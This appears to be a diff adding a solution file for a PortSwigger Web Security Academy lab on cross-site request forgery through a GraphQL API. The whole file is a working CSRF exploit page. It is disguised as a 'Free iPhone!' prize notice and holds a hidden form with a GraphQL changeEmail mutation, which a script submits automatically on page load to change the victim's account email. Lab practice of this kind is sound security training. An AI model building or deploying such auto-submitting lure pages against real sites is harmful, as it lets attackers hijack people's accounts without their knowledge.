@@ -1,0 +1,21 @@
+<!-- The following payload is meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free iPhone!</title>
+</head>
+<body>
+    <p>Congratulations You've Won!</p>
+    <form method="POST" action="https://[LAB_SUB_DOMAIN].web-security-academy.net/graphql/v1">
+        <input type="hidden" name="query" value='mutation changeEmail{changeEmail(input:{email:"wiener2@normal-user.net"}){email}}'>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
